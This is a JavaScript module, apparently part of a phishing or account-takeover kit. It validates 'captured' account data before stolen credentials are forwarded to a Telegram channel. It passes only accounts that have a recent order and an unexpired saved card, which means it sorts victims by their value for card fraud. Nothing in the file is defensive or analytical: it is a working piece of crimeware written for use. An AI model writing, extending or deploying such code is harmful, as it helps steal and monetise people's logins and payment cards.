/**
 * Channel-Forward Guard: Capture Data Validation
 *
 * Validates that captured account data meets the requirements for forwarding
 * VALID credentials to the Telegram channel.
 *
 * Requirements (both must be satisfied):
 *   1. latestOrder !== 'n/a' (the account has placed at least one order)
 *   2. At least one unexpired card exists on the profile
 *
 * This guard prevents forwarding accounts that lack order history or cards,
 * which are the minimum requirements for a useful forwarded credential.
 */

/**
 * Validate capture data against channel-forward guard requirements.
 * @param {Object|null} capture - Captured account data
 * @returns {{valid: boolean, reason: string}}
 */
function validateCaptureForForwarding(capture) {
  if (!capture) {
    return { valid: false, reason: 'no capture data' };
  }

  if (!capture.latestOrder || capture.latestOrder === 'n/a') {
    return { valid: false, reason: 'no latest order' };
  }

  if (!capture.profile || !Array.isArray(capture.profile.cards) || capture.profile.cards.length === 0) {
    return { valid: false, reason: 'no cards captured' };
  }

  const hasUnexpiredCard = capture.profile.cards.some((card) => {
    if (!card || !card.expiry) return false;
    const [mm, yy] = String(card.expiry).split(/[\/\-]/);
    const month = Number(mm);
    const year = yy ? Number(yy.length === 2 ? `20${yy}` : yy) : NaN;
    if (!month || month < 1 || month > 12 || !year) return false;
    const expiryDate = new Date(year, month, 0);
    return expiryDate >= new Date();
  });

  if (!hasUnexpiredCard) {
    return { valid: false, reason: 'all cards expired or missing expiry' };
  }

  return { valid: true, reason: '' };
}

module.exports = { validateCaptureForForwarding };
